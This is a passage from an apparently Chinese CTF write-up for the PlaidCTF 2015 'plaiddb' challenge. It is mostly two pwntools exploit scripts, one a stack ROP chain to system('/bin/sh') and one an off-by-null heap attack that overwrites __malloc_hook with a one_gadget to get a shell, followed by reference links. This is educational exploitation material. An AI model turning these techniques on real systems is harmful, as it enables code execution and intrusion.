	p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(system_addr)).ljust(0x3e8, 'Q') # place gadgets
) # fastbin corruption
#raw_input('@')

cmd('PUT')
p.recvuntil('Enter row key:')
p.sendline('KEY1')
p.recvuntil('Enter data size:')
p.send('56'.ljust(8, ' ') + p64(0x42))
p.recvuntil('PROMPT: Enter data:')
#raw_input('@')
p.send(('A' * 7 + p64(canary) + 'A' * 0x10 + p64(fake_rbp) + p64(leave_ret)).ljust(55, 'A'))
p.recvuntil('INFO: Update successful.\n')

p.interactive()
```

另一种做法：

```python
#!/usr/bin/env python
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

local = 1
if local:
	p = process('./datastore')
	libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
	p = remote('127.0.0.1', 4000)
	libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def cmd(c):
	p.recvuntil('Enter command:')
	p.sendline(c)

def PUT(key, data):
	cmd('PUT')
	p.recvuntil('Enter row key:')
	p.sendline(key)
	p.recvuntil('Enter data size:')
	p.sendline(str(len(data)))
	p.recvuntil('PROMPT: Enter data:')
	p.send(data)

def DEL(key):
	cmd('DEL')
	p.recvuntil('Enter row key:')
	p.sendline(key)

def GET(key):
	cmd('GET')
	p.recvuntil('Enter row key:')
	p.sendline(key)
	p.recvuntil(' bytes]:\n')
	return p.recvuntil('PROMPT: ')[:-8]

for i in range(10):
	PUT(str(i), str(i) * 0x38)
for i in range(10):
	DEL(str(i))

PUT('1', '1' * 0x200)
PUT('2', '2' * 0x50)
PUT('5', '5' * 0x68)
PUT('3', '3' * 0x1f8)
PUT('4', '4' * 0xf0)
PUT('6', '6' * 0x400)
DEL('5')
DEL('3')
DEL('1')
DEL('A' * 0x1f0 + p64(0xbd0 - 0x6f0)) # off-by-null + shrink
DEL('4') # unlink
PUT('fillup1', 'X' * 0x200)
PUT('fillup2', 'X' * 0x200)
data = GET('2')
libc_base = u64(data[:8]) - 0x3c27b8
info('libc_base = ' + hex(libc_base))
#raw_input('@')

free_hook = libc_base + libc.symbols['__free_hook']
malloc_hook = libc_base + libc.symbols['__malloc_hook']
system = libc_base + libc.symbols['system']
one_gadgets = [0x46428, 0x4647c, 0xe9415, 0xea36d]
one_gadget = libc_base + one_gadgets[1]
info('one_gadget = ' + hex(one_gadget))
PUT('fastatk', ('A' * 0x58 + p64(0x71) + p64(malloc_hook - 0x23)).ljust(0x100, '\x00'))
PUT('X', 'X' * 0x68)
#raw_input('@')
PUT('atk', ('A' * 0x13 + p64(one_gadget)).ljust(0x68, '\x00'))
DEL('2')

p.interactive()
```

# References

https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/off_by_one-zh/#2-plaidctf-2015-plaiddb
https://www.youtube.com/watch?v=jEHgm7S58N8
http://winesap.logdown.com/posts/261369-plaid-ctf-2015-plaiddb-writeup
